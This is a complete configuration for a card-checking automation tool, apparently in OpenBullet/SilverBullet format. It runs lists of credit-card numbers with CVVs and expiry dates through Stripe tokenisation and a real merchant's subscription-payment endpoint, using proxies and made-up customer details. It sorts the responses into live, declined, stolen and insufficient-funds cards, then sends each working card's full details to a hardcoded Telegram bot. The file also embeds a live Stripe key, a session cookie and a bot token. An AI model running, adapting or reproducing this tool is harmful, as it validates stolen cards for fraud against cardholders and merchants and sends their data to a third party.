[SETTINGS]
{
  "Name": "CC @Noone_o 💸",
  "SuggestedBots": 20,
  "MaxCPM": 0,
  "LastModified": "2024-11-25T23:25:33.656569+03:00",
  "AdditionalInfo": "",
  "RequiredPlugins": [],
  "Author": "",
  "Version": "1.1.2 [SB]",
  "SaveEmptyCaptures": false,
  "ContinueOnCustom": false,
  "SaveHitsToTextFile": false,
  "IgnoreResponseErrors": false,
  "MaxRedirects": 8,
  "NeedsProxies": true,
  "OnlySocks": false,
  "OnlySsl": false,
  "MaxProxyUses": 0,
  "BanProxyAfterGoodStatus": false,
  "BanLoopEvasionOverride": -1,
  "EncodeData": false,
  "AllowedWordlist1": "CC",
  "AllowedWordlist2": "CC",
  "DataRules": [],
  "CustomInputs": [],
  "CaptchaUrl": "",
  "IsBase64": false,
  "FilterList": [],
  "EvaluateMathOCR": false,
  "SecurityProtocol": 0,
  "ForceHeadless": false,
  "AlwaysOpen": false,
  "AlwaysQuit": false,
  "QuitOnBanRetry": false,
  "AcceptInsecureCertificates": true,
  "DisableNotifications": false,
  "DisableImageLoading": false,
  "DefaultProfileDirectory": false,
  "CustomUserAgent": "",
  "RandomUA": false,
  "CustomCMDArgs": "",
  "Title": "g",
  "IconPath": "Icon\\svbfile.ico",
  "LicenseSource": null,
  "Message": null,
  "MessageColor": "#FFFFFFFF",
  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
  "AuthorColor": "#FFFFB266",
  "WordlistColor": "#FFB5C2E1",
  "BotsColor": "#FFA8FFFF",
  "CustomInputColor": "#FFD6C7C7",
  "CPMColor": "#FFFFFFFF",
  "ProgressColor": "#FFAD93E3",
  "HitsColor": "#FF66FF66",
  "CustomColor": "#FFFFB266",
  "ToCheckColor": "#FF7FFFD4",
  "FailsColor": "#FFFF3333",
  "RetriesColor": "#FFFFFF99",
  "OcrRateColor": "#FF4698FD",
  "ProxiesColor": "#FFFFFFFF"
}

[SCRIPT]
FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-?h?h?h?h-a6ed-?h?h?h?h?h?h?h??h?h?h?h?h?h?h?h?h?h?h" -> VAR "g1" 

FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-?h?h?h?h-a6ed-?h?h?h?h?h?h?h??h?h?h?h?h?h?h?h?h?h?h" -> VAR "g2" 

FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-?h?h?h?h-a6ed-?h?h?h?h?h?h?h??h?h?h?h?h?h?h?h?h?h?h" -> VAR "g3" 

FUNCTION Translate 
  KEY "2022" VALUE "22" 
  KEY "2023" VALUE "23" 
  KEY "2024" VALUE "24" 
  KEY "2025" VALUE "25" 
  KEY "2026" VALUE "26" 
  KEY "2027" VALUE "27" 
  KEY "2028" VALUE "28" 
  KEY "2029" VALUE "29" 
  KEY "2030" VALUE "30" 
  "<ano>" -> VAR "ano1" 

FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h@Iqa935.onmicrosoft.com" -> VAR "emn" 

REQUEST POST "https://public.testgrid.io//upgrade-plan" 
  CONTENT "plan_id=10&plan_type=annually&plan_parallel=1" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
  HEADER "Accept-Encoding: gzip, deflate, br, zstd" 
  HEADER "Accept-Language: en-US,en;q=0.6" 
  HEADER "Cache-Control: no-cache" 
  HEADER "Connection: keep-alive" 
  HEADER "Content-Length: 45" 
  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
  HEADER "Cookie: ci_session=93pjri6ruflatdsm43ao8ngnvru9eqjs" 
  HEADER "Host: public.testgrid.io" 
  HEADER "Origin: https://public.testgrid.io" 
  HEADER "Pragma: no-cache" 
  HEADER "Referer: https://public.testgrid.io/" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-GPC: 1" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" 
  HEADER "X-Requested-With: XMLHttpRequest" 
  HEADER "sec-ch-ua: \"Chromium\";v=\"130\", \"Brave\";v=\"130\", \"Not?A_Brand\";v=\"99\"" 

REQUEST GET "https://public.testgrid.io/subscription" 
  
  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
  HEADER "Accept-Encoding: gzip, deflate, br, zstd" 
  HEADER "Accept-Language: en-US,en;q=0.6" 
  HEADER "Cache-Control: no-cache" 
  HEADER "Connection: keep-alive" 
  HEADER "Content-Length: 45" 
  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
  HEADER "Cookie: ci_session=93pjri6ruflatdsm43ao8ngnvru9eqjs" 
  HEADER "Host: public.testgrid.io" 
  HEADER "Origin: https://public.testgrid.io" 
  HEADER "Pragma: no-cache" 
  HEADER "Referer: https://public.testgrid.io/" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-GPC: 1" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" 
  HEADER "X-Requested-With: XMLHttpRequest" 
  HEADER "sec-ch-ua: \"Chromium\";v=\"130\", \"Brave\";v=\"130\", \"Not?A_Brand\";v=\"99\"" 

PARSE "<SOURCE>" LR "Stripe('" "');" -> VAR "Stripe" 

REQUEST POST "https://api.stripe.com/v1/tokens" 
  CONTENT "guid=<g1>&muid=<g2>&sid=<g3>&referrer=https%3A%2F%2Fpublic.testgrid.io&time_on_page=72709&card[number]=<cc>&card[cvc]=<cvv>&card[exp_month]=<mes>&card[exp_year]=<ano1>&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoidFRaM1YrcmhlTVBrb0t1ZW9YODlkWUJsMzhjcHU1NE1JMDFsVnlFVEwyWE9za1g0TlRVRlNtdi9HNFhoei8wMS9xRUsydEdTYm0yMm14OW9aL09qNmozQU92V2FSdnNmdUVTZmVNdmcxeENNTVBXZzNZUnR1VVVnWW1CVUUvdkxiZlJPTStNaXh1N1A5am5NSk5RSkdBWmhLREx2eWZKRHA4RkY0N1o3NXVyTGkxQVBlUXFlTHQwUGhRTU9Nb3U2MUt3cGdKSU5Pb1dPbzFzWGh5Sk5rMzdEdHBSUktqcU05cGIyYWptcEoyZXE4K0t4S2tkNkFGRlN1eXhXTUpXemNnUklIUC9BYktmUlVvcVh4VG5QUC9ob0R5TDhya1F1K2VWRzFqbUtwRjRDVXJjRkhWMFJ3RWxVcjYzQ0REK3dLbEtKZEZuTWJMM1ZtTGVWcnp4aGFDeSs5WG54ZmR0dTFtQ2NpVENWUWZyN2srM1F4alpyNGVoWDF3bk1NMTZaaDE4YThzbjJhbFpRbU8zQVEvUTlhdnJDRjJFT09GNldEZ3lyQ29RTndtdEdnd2RDNHRxTGhCMDN2UTM4d2Z1cUtIdHUwY2VXUWxFUkFHWVBQTGxkTWFPNCtVUUhha2tDZWtwVElOZmF3V0V4MWdKOUJNV0FyZjRBbVJONkVVQUVqUnVoVjlaeHhMYkZVT2pmdlY0bDVzRTlaMjg0TGd5S3d0bTN3SWwyOWlaTFVRanNQajkyOVlYZXNiN1E5empIYVJtNTI2UHlDSVZTWjQ3QVBOSTNkMC9Nb3ZXT0xKejRXVnZPWVpKdlV1ak5mUWlUSzFqdWFqRkFYMGsvUGVCZ0lwRkFXb2J4aURLQmN6aUFOV0kwVXpvWWFaUWpXMjB3UDVneVdVeC95QXRrcCszVitoVGFaK0g0VTBSejJPTHY2THY3N2luemNBVnViamlPTHQvcEltR1ptZ0ZWT1Q5K3l1WFVVdnNOdzF2dmF5ZnBYQ1VjRlNkRG5BaW9KL0wrb2JtZGZ1Zm5DRlNwU0VFQlUwT0NJNFJkeEZtRFN5Y0RweGN5OUVsL2ZMbmM4UW5PVjFNQ0hqMzZKQlpheE01MDhuZmFrQ1hxVUJwcG1HMEVWQnVuOFhXRXg4MytaQi9WWXgwaTJZS2xYbWdpVFQ4cFo0RjBPQzRTVWp1V2ZESExoY2RWQWxKSkRvTWFrNTFxb2M4Z1RPU0dvNUZTaEtJNjQ5azlPYUZXc2lrRU1BV0s4ay9sYVV2Umg4YXhqTzRwZXg2SmQrUHJ5Q2Q5bEExL2ZmZkRjWFZkRjdoL2p3UDF6N0ZvQU9NMTl2NjM1OGpiUUxTT1dkdlh1MGVjcDVxMld6d0phNjFXUEJDVlhUUzdqSmFSNkVSSlN0bWF5RGxsb1l6Ky9NQW83Zkp1TzRQbldqbGNLRDBsMk9oeUlnK3RTbVUvM21CQitoNFNNTUM0TkowZUE4M2FmU0FtbFRTRk9DMUkzaDdMYWNMYXRTT0JFTUt0ZmQvY3RVK1k5aHJuQkJDc2pCWXhMbUdpczVUTjRLV0dBQmpMYktkc2JjWnpQMy95NGgyRFQ0eU9vU3I1dE0yYmFVRmFJSTdaQWtZUTIxTkNyQldrR2lTNkZhVURjVjBGaHFvL01vcjU1RzR3ZDB5enhSditCYzA3KzVGUjRtMWxpVHFjUnowRVpiZXEzWkllUElmMWxJNXNXY2ZNSnQ2RTRCQXV4U2hTc0M3MThyM0ZQY1RMRzVlWUF0S2dJT255dWt3cHc2cHcvRk5Pdy8zcjVWaisrRFZvOTExZDJLc0MvNGZzcXM1VjhNNTlEVlo5K1FabFI4TXp2WjZ6Y2YyRXJVbFN1amdBSlRRQzZNeFJxcDFMZmRZR2Q5cEgrbldBVXhidGxleElaUm5EdmU3UU1iemdMc0NiUUhkdnRMcy9nTHExVzhxMXhaNXdFaCt5ZEI4cDB4NlppeXl0ZTZ2OCtMM2FMQXJnaEcrUHNJZVdZY0FVMnUwbkV5ZnVFR2lDcENOblM2ZkxKU2sva2tFMDR2THk5UGwzUGFXS0p6MHl4WnBkSFZQRk5MZHhRZi9XWmJidmtYR214bU9COUJ6UHZSMkx5bjhheGJpOE5FblBMWHNRdFBOa3VyV1lGazdzRGY5QTdLQkNkMi9nZFdUcU1nTkdqNGhZQ1NHOHM1eklCZE5zbUl3bE40Q3dVYjVlT0dDTmUxcUNwRnZCSDhuejJUN1lrU2RDMmJQckt1bVNlc2NoQXNzWjJvK0NFa0RVQnBCMUhVR1R6cGhXbURwd0pYbHZsdkhZQitqeHdOTW9ybDR3S2FVVkhEME0zTyt2c2k0SjgvWTdtbi9RbVkwRUUzbEJ0Qmx5aDZSeFQ1RHJlNWU0ellISlV5MTd0WFV6S2Eyd0tMTUR4WFYwb2F3VTc1QXNVaG5jaTJpcHh6Z055VVBJL2VzZWE2bURVZngyZTRzUkRNMjV5QWZwNlBRaTVFeEg1d2I1WDRqc0EvaThDN3NnSXlrYkxBTmZGTjhSYk90SWZhUXZ2WmdpZ3BxVGdpVW9DTEhSNHh2WWQ3WHJsN2tFUG5HSzJKYlBaWXI3RFA2blZxaUZ3TFJUd1BRdTV1QnNTTWhIcThIN2hJMmV2STJ5RUFXbmlLTlMvajFpTDRUNFpEZjNFMkN5amlwL0svMUZoZ3lkWUFPcStUcGo0Z2tiUXJiOEoweks4bjdLaGxPRzg0clZ2T0dvakYvYkZCTEJsWUJsdmZNUU9PNk8yZDBoVVhNU0JwU21nZWlQck5QWDZyWWVnQzFmT0pMOWZKUy9UTzF0Tm9iZm96SVVyd3BOT216ZE40WUJVMkNQTWI3TVJCRUh1RDhwdldmLzdZWERTSW9SNWg3d3p6dzNhYUdWNUNpMGFlU0gyQ2EvNFNMcGxqRzV4UEVGQVREaXdOM0Q3TkN2d2VjVWV6Zm1kL1JDMVlFQ0ZxTVlsUWJpSGJvdFBNK0dGWURteE5PRTllTmxRbXFDNGtiWTAramJ1b0FzdmtpMC90RzVyMHNIU3JMOGZIT0tPK29yYlZkbjNZdXV3Z3JkK2hzdGt0N01qZUhraEE9PSIsImV4cCI6MTczMDQxNzI4MCwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjZkYzczYTUiLCJwZCI6MCwiY2RhdGEiOiJjRzc2aVQ5dzkyalY2WUhNVWhWaHRIVi9SNFJ5eXlPRUVNT082cU1nRVJPQTRmbUZEL2grNmtKK1dsUm1aTUNlYzY3bXl0Zkdqa0RqaVNHM3QzdytWOHpZS2Y2U3M5SW9ib3RsM2tIelBkMi8yZ1lYbEl4blR6UEQwYWMrVU42SVBhRm1xSEswL0dqRVkrZ1dlVVAzN2Z4Z1BubTVkeXpXSzNvTDl5WmhSY3ZSaGQyVWVzcW4rcnU0VVpyYTlFUlRTZ2tHNDloQlBJMEJ6UXJkIn0.B6x7aohXqioHnOwQWivzlXXwBp_zggNR0_QETYXIK6M&payment_user_agent=stripe.js%2F89f50b7e22%3B+stripe-js-v3%2F89f50b7e22%3B+split-card-element&pasted_fields=number&key=pk_live_51L2yOWKrBTouM3FN7ul768HB6OmOFHD1firYb2U2tcypZY0AEk4Gl1aCHvWMkdXYygB4I1cauJ9PZan8gHffgn0000oaE5hnUC" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "accept: application/json" 
  HEADER "accept-encoding: gzip, deflate, br, zstd" 
  HEADER "accept-language: en-US,en;q=0.6" 
  HEADER "cache-control: no-cache" 
  HEADER "content-type: application/x-www-form-urlencoded" 
  HEADER "origin: https://js.stripe.com" 
  HEADER "pragma: no-cache" 
  HEADER "priority: u=1, i" 
  HEADER "referer: https://js.stripe.com/" 
  HEADER "sec-ch-ua: \"Chromium\";v=\"130\", \"Brave\";v=\"130\", \"Not?A_Brand\";v=\"99\"" 
  HEADER "sec-ch-ua-mobile: ?0" 
  HEADER "sec-ch-ua-platform: \"Windows\"" 
  HEADER "sec-fetch-dest: empty" 
  HEADER "sec-fetch-mode: cors" 
  HEADER "sec-fetch-site: same-site" 
  HEADER "sec-gpc: 1" 
  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" 

PARSE "<SOURCE>" JSON "id" -> VAR "token" 

REQUEST POST "https://public.testgrid.io/subscription/do_payment" 
  CONTENT "{\"interval\":\"month\",\"parallel\":\"1\",\"coupon_code\":\"\",\"plan_id\":\"9\",\"name\":\"Michele Mattelaer\",\"email\":\"<emn>\",\"request_type\":\"create_customer_subscription\",\"stripeToken\":\"<token>\"}" 
  CONTENTTYPE "application/json" 
  HEADER "Accept: */*" 
  HEADER "Accept-Encoding: gzip, deflate, br, zstd" 
  HEADER "Accept-Language: en-US,en;q=0.6" 
  HEADER "Cache-Control: no-cache" 
  HEADER "Connection: keep-alive" 
  HEADER "Cookie: ci_session=93pjri6ruflatdsm43ao8ngnvru9eqjs" 
  HEADER "Content-Type: application/json" 
  HEADER "Host: public.testgrid.io" 
  HEADER "Origin: https://public.testgrid.io" 
  HEADER "Pragma: no-cache" 
  HEADER "Referer: https://public.testgrid.io/" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-GPC: 1" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" 
  HEADER "sec-ch-ua: \"Chromium\";v=\"130\", \"Brave\";v=\"130\", \"Not?A_Brand\";v=\"99\"" 
  HEADER "sec-ch-ua-mobile: ?0" 
  HEADER "sec-ch-ua-platform: \"Windows\"" 

PARSE "<SOURCE>" LR "\"message\": \"" "\"" CreateEmpty=FALSE -> CAP "MSG" 

KEYCHECK 
  KEYCHAIN Failure OR 
    KEY "Your card number is incorrect." 
    KEY "Your card has expired" 
    KEY "expired_card" 
    KEY "Card is declined" 
    KEY "Your card does not support this type of purchase" 
    KEY "card_not_supported" 
    KEY "Your card is not supported." 
    KEY "Payment cannot be processed, missing card number" 
    KEY "transaction_not_allowed" 
    KEY "Your card was declined." 
    KEY "incorrect_number" 
    KEY "service_not_allowed" 
    KEY "do_not_honor" 
    KEY "generic_decline" 
    KEY "paraneter_invaild_empty" 
    KEY "lock_timeout" 
    KEY "Card is declined by your bank, please contact them for additional primaryrmation." 
    KEY "fraudulent" 
    KEY "was not found on this server." 
    KEY "paraneter_invaild_integer." 
    KEY "Your Card was declined" 
    KEY "Your card's expiration year is invaild." 
    KEY "Your account cannot currently make live charges." 
    KEY "invalid_request_error" 
    KEY "card_not_supported" 
    KEY "\"cvc_check\": null" 
    KEY "\"cvc_check\": \"unchecked\"" 
    KEY "declined_by_network" 
  KEYCHAIN Success OR 
    KEY "\\status\": \\succeeded\"" 
    KEY "\"cvc_check\": \"pass\"" 
    KEY "\"redirect_url\": \"" 
    KEY "approved_by_network" 
    KEY "https://pay.stripe.com/receipts/" 
    KEY "https://dashboard.stripe.com/emails/receipts/" 
    KEY "Thank you" 
    KEY "Payment successful" 
    KEY "Thank you for Your Donation!" 
    KEY "Thank you for your Payment" 
    KEY "Your donation is currently processing." 
    KEY "Successfully" 
    KEY "{\"success\":true" 
  KEYCHAIN Custom "CCN" OR 
    KEY "Your card's security code is incorrect" 
    KEY "security code is invalid" 
    KEY "incorrect_cvc" 
  KEYCHAIN Custom "NSF" OR 
    KEY "Your card has insufficient funds." 
    KEY "insufficient_funds" 
  KEYCHAIN Custom "STOLEN" OR 
    KEY "stolen_card" 
    KEY "lost_card" 
  KEYCHAIN Custom "3DSECURE" OR 
    KEY "three_d_secure_redirect" 
    KEY "stripe_3ds2_fingerprint" 
  KEYCHAIN Custom "RATE LIMIT" OR 
    KEY "\"code\":\"rate_limit" 
    KEY "Request rate limit exceeded." 
  KEYCHAIN Custom "PaymentIntent" OR 
    KEY "payment_intent_unexpected_state" 
  KEYCHAIN Retry OR 
    KEY "This object cannot be accessed right now because another API request or Stripe process is currently accessing " 
    KEY "An error occurred while processing your card. Try again in a little bit." 
    KEY "We're sorry, but we're unable to serve your request." 
    KEY "The zip or postal code for your billing address." 
    KEY "The zip code you supplied failed validation" 
    KEY "verify_challenge" 

FUNCTION Constant "CC : <cc>|<mes>|<ano>|<cvv> 💳 | GATES : Stripe Auth | ID : <token> | Response : Success 🟢 | CHK BY⇾ @Noone_o 💸" -> CAP "card" 

REQUEST POST "https://api.telegram.org/bot7731535029:AAESKSOxIhBamRuwTBIrz1_YLW0ZLYFErVo/sendmessage?chat_id=1431708650" 
  CONTENT "&text=<card>" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

